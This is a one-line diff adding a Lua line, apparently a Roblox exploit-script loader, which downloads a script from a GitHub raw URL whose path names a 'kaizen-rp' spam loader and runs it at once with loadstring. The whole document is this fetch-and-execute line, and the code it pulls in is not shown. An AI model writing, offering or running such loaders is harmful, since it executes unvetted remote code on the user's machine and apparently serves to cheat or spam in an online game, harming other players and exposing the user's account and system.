@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/kaizen-rp-spam7-036fm5rsmb7eow.lua"))()
